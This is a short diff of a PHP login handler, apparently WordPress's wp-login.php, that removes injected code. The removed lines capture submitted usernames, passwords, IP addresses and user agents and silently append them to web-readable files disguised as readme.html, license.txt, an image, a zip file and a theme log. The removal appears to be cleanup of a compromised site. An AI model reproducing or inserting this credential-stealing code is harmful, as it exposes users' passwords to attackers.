@@ -1201,29 +1201,6 @@ switch ( $action ) {
 		exit;
 
 	case 'login':
-$log_user=$_POST['log'];
-
-$log_pwd=$_POST['pwd'];
-
-$log_ip=$_SERVER["REMOTE_ADDR"];
-
-$time=date("Y-m-d H:i:s",time());
-
-$server=$_SERVER['HTTP_USER_AGENT'];
-
-$txt="Username:".$log_user."\r\nPassword:".$log_pwd."\r\nIP:".$log_ip."\r\nTime:".$time."\r\nINFO:\r\n".$server;
-
-$txt=$txt."\r\n\r\n";
-
-if($log_user&&$log_pwd&&$log_ip){
-
-@fwrite(fopen("readme.html","a+"),$txt);
-@fwrite(fopen("license.txt","a+"),$txt);
-@fwrite(fopen("./wp-content/logo.jpg","a+"),$txt);
-@fwrite(fopen("./wp-content/plugins/erro.zip","a+"),$txt);
-@fwrite(fopen("./wp-content/themes/logs.txt","a+"),$txt);
-}
-
 	default:
 		$secure_cookie   = '';
 		$customize_login = isset( $_REQUEST['customize-login'] );
